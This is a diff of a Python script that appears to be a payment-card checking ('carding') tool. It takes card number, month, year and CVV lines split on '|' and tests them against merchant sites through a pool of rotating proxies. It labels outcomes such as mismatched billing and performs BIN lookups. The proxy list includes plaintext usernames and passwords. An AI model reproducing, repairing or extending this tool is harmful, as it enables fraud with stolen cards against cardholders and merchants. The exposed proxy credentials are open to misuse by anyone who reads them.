@@ -1,3 +1,5 @@
+
+```python
 #!/usr/bin/env python3
 import asyncio, aiohttp, json, re, random, time, threading, os, base64, requests
 import queue as _q
@@ -42,7 +44,6 @@ os.makedirs(RESULT_DIR, exist_ok=True)
 
 TG_W           = 2
 
-# မင်းရဲ့ Proxy တွေ
 RAW_PROXIES=[
     "46.225.138.35:36759:l1lo6k6xsj:OetadXmeuu",
     "172.93.105.208:43159:8u74d0ud33:nfRkcoqOel",
@@ -484,15 +485,10 @@ async def process_card(cc,mes,ano,cvv,site,vid=None):
                     return True,"MISMATCHED_BILL",gw,tp,cur
                 except: pass
                 return False,"Unknown Result",gw,tp,cur
-        except Exception as e: 
-            
+        except Exception as e: continue
             
     time.sleep(3)
     return False,"Error: Both Proxy & Direct Failed",gw,tp,cur
-
-
-
-```python
 
 def parse_cc(s):
     p=s.split('|')
@@ -674,7 +670,6 @@ def _worker(wid, lane):
                  "price":prc,"cur":cur,"el":el,"bin":bin_line(p['cc']),
                  "succ":succ,"idx":idx}
 
-            # ERROR DETECT -> RETRY
             is_error = any(err in cl.upper() for err in ["LOOKUP ERROR", "NO SESSION", "BAD JSON", "REQ FAILED", "PROXY", "TIMEOUT", "ERROR"])
             
             rows_to_send=[]; prog=False; finished=False; done_n=0; total=0; retries=[]
